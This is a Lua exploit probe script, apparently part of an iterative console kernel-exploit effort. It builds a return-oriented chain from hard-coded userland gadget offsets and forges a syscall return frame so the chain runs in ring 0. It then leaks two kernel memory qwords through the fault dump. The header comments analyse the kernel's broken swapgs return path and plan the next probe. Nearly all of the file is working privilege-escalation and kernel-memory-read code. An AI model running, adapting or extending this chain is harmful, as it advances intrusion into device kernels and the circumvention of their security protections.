-- CRASH_CLASS: RISKY -- ring-0 chain; process dies by design, console survives
-- PROBE 1367c: two kernel qwords exfiltrated through the dump, no return needed
--
-- 1366a/1367b established that the ring-0 chain runs but the return is broken: the
-- kernel's own return path is (13.60 base+0x257B28)
--
--     test byte ptr [rsp+0xF0], 3     ; tf_cs & 3
--     je   +4                         ; RPL 0 -> SKIP cli and swapgs
--     cli
--     swapgs
--     add rsp, 0xE8
--     iretq
--
-- With CS=0x08 the swapgs is skipped, so userland resumes with GS = the kernel
-- per-CPU base and libkernel's post-`syscall` code dies (SIGBUS si_addr 0x16,
-- unchanged when rax/rsi/rdi are pointed at a self-referential page).
--
-- Before fixing that, this run uses the dump as a two-qword reader. The iretq back
-- to CPL3 loads RIP and RSP from our frame without dereferencing either, and the
-- loader's handler prints both: the fault at the RIP value then produces a
-- SIGSEGV whose mcontext carries RIP = the first qword and RSP = the second.
--
--   qword 1 = [kernel base + 0]        -> RIP slot (expected ELF magic, canonical)
--   qword 2 = [kernel base + 0x257B33] -> RSP slot (any value, never dereferenced)
--
-- qword 2 is the one that matters for the next step: it should be
-- 0x00E8C48148F8010F (swapgs; add rsp,0xE8 if 14.10 matches 13.60). If it is, the
-- next probe borrows that instruction to restore GS and return cleanly.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1367b_ring0_safe_return_20261109_115658.txt
--   results/phase35_dead_end_reruns/1366a_ring0_kernel_read_20261109_115002.txt
--   results/phase35_dead_end_reruns/1365a_chain_gadget_validate_20261109_114725.txt
--   docs/dumps_13.60/kernel_text.bin (doreti tail at file 0x257b28..0x257b3d)

if _G.__p1367c_ran then
    print("[!] RE-ENTRY")
    print("=== PROBE 1367c RE-ENTRY ===")
    return
end
_G.__p1367c_ran = true

print("=== PROBE 1367c: TWO-QWORD KERNEL READ VIA THE DUMP ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_wd(addr, val)
    return (pcall(function() memory.write_dword(addr, val) end))
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok and v ~= nil then return to_num(v) end
    return nil
end
local function rdq(addr)
    local ok, v = pcall(function() return memory.read_qword(addr) end)
    if not ok or v == nil then return nil end
    return to_num(v)
end
local function wrq(addr, val)
    pcall(function() memory.write_qword(addr, val) end)
end
local function u64v(v) return uint64(string.format("0x%X", v)) end
local function U(hi, lo) return uint64(string.format("0x%X%08X", hi, lo)) end

local KBASE_HI = 0xFFFFFFFF
local KBASE_LO = 0xC1000000

local sc593 = make_syscall(593)
local sc421 = make_syscall(421)
local sc417 = make_syscall(417)
local sc20 = make_syscall(20)

print(string.format("[0] pid=%d", to_num(sc20(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))))

local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local EBN = to_num(eb_lo) + to_num(eb_hi) * 4294967296
print(string.format("[0] eboot base=0x%X  A=0x%X%08X  B=0x%X%08X",
    EBN, KBASE_HI, KBASE_LO, KBASE_HI, KBASE_LO + 0x257B33))

local S = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(S + off, 0) end
local SA = to_num(S)
local FP = SA + 0x100

local G_POPSI  = EBN + 0xD77D
local G_MOVRD  = EBN + 0x1A5CC4
local G_POPRDI = EBN + 0xC9DFE
local G_MOVWR  = EBN + 0x92C67
local G_POPRSP = EBN + 0x9A2
local G_IRET   = EBN + 0x11F41

local i = 0
local function put(g, v) wrq(S + i, u64v(g)); if v then wrq(S + i + 8, v) end; i = i + 0x10 end
put(G_POPSI,  U(KBASE_HI, KBASE_LO))
put(G_MOVRD,  nil)
put(G_POPRDI, u64v(FP + 0x20))      -- qword 2 -> RSP slot
put(G_MOVWR,  nil)
put(G_POPSI,  U(KBASE_HI, KBASE_LO))
put(G_MOVRD,  nil)
put(G_POPRDI, u64v(FP + 0x08))      -- qword 1 -> RIP slot
put(G_MOVWR,  nil)
put(G_POPRSP, u64v(FP))

local F = memory.alloc(0x600)
for off = 0, 0x5FC, 4 do safe_wd(F + off, 0) end
local ok421 = pcall(function() return sc421(uint64(F)) end)
if not ok421 then print("=== PROBE 1367c ABORT (421) ===") return end
local orig_rip    = rdq(F + 0xE0) or 0
local orig_cs     = rdq(F + 0xE8) or 0
local orig_rflags = rdq(F + 0xF0) or 0
print(string.format("[1] live RIP=0x%X CS=0x%X RFLAGS=0x%X", orig_rip, orig_cs, orig_rflags))
if orig_cs ~= 0x43 then print("=== PROBE 1367c: unexpected CS, ABORT ===") return end

wrq(FP + 0x00, u64v(G_IRET))
wrq(FP + 0x08, u64v(0x10000))       -- qword 1 lands here
wrq(FP + 0x10, u64v(0x43))
wrq(FP + 0x18, u64v(orig_rflags))
wrq(FP + 0x20, u64v(0x10000))       -- qword 2 lands here
wrq(FP + 0x28, u64v(0x3B))

wrq(F + 0xE0, u64v(G_POPRSP))
wrq(F + 0xE8, u64v(0x08))
wrq(F + 0xF8, u64v(SA))

print("[2] installing frame: chain reads [kbase] and [kbase+0x257B33] into the")
print("    return frame's RIP and RSP slots, then iretq -> CPL3 -> fault dump")
local ok417, rv417 = pcall(function() return sc417(u64v(to_num(F))) end)
if ok417 then
    print(string.format("[2] 417 returned %s", tostring(to_num(rv417))))
else
    print("[2] 417 EXC")
end
print("=== PROBE 1367c COMPLETE ===")
